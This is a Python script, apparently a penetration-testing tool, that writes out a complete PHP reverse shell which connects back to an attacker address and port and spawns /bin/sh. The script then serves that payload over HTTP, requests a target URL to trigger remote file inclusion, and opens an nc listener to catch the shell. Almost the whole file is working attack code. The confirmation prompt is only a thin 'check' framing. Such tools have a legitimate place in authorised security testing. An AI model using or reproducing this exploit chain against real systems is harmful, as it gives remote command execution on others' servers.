import threading
import os
import http.server
import socketserver
import requests
import logging
import time
import sys

def rfi_to_rce_check(url):
    attacker_ip = "127.0.0.1"  # Default to localhost
    attacker_port = 4444  # Default port for the reverse shell
    attacker_server_port = 8000  # Default port for the HTTP server

    payload = f'''
    <?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = "{attacker_ip}";
    $port = {attacker_port};
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    if (function_exists('pcntl_fork')) {{
        $pid = pcntl_fork();
        if ($pid == -1) {{
            printit("ERROR: Can't fork");
            exit(1);
        }}
        if ($pid) {{
            exit(0);
        }}
        if (posix_setsid() == -1) {{
            printit("Error: Can't setsid()");
            exit(1);
        }}
        $daemon = 1;
    }} else {{
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }}

    chdir("/");
    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {{
        printit("$errstr ($errno)");
        exit(1);
    }}

    $descriptorspec = array(
       0 => array("pipe", "r"),
       1 => array("pipe", "w"),
       2 => array("pipe", "w")
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {{
        printit("ERROR: Can't spawn shell");
        exit(1);
    }}

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {{
        if (feof($sock)) {{
            printit("ERROR: Shell connection terminated");
            break;
        }}

        if (feof($pipes[1])) {{
            printit("ERROR: Shell process terminated");
            break;
        }}

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {{
            if ($debug) printit("SOCK READ");
            $input = fread($sock, $chunk_size);
            if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }}

        if (in_array($pipes[1], $read_a)) {{
            if ($debug) printit("STDOUT READ");
            $input = fread($pipes[1], $chunk_size);
            if ($debug) printit("STDOUT: $input");
            fwrite($sock, $input);
        }}

        if (in_array($pipes[2], $read_a)) {{
            if ($debug) printit("STDERR READ");
            $input = fread($pipes[2], $chunk_size);
            if ($debug) printit("STDERR: $input");
            fwrite($sock, $input);
        }}
    }}

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    function printit ($string) {{
        if (!$daemon) {{
            print "$string\\n";
        }}
    }}
    ?>
    '''

    with open('payload.php', 'w') as f:
        f.write(payload)

    def start_http_server():
        os.chdir(os.path.dirname(os.path.realpath(__file__)))
        socketserver.TCPServer.allow_reuse_address = True
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", attacker_server_port), Handler)
        httpd.serve_forever()

    def send_request():
        try:
            requests.get(url)
        except Exception as e:
            logging.error(f"Error sending RFI request: {e}")

    def start_nc_listener():
        os.system(f'nc -lvp {attacker_port}')

    http_server_thread = threading.Thread(target=start_http_server)
    request_thread = threading.Thread(target=send_request)
    listener_thread = threading.Thread(target=start_nc_listener)

    http_server_thread.start()
    time.sleep(3)
    request_thread.start()
    listener_thread.start()

    http_server_thread.join()
    request_thread.join()
    listener_thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python rfi_to_rce_check.py <target_url>")
        sys.exit(1)

    print("WARNING: This script can pose a significant security risk to your local machine.")
    print("It is recommended to run it in an isolated environment, such as a Docker container.")
    confirmation = input("Do you want to continue? (yes/no): ")
    if confirmation.lower() != 'yes':
        sys.exit(1)

    url = sys.argv[1]
    rfi_to_rce_check(url)
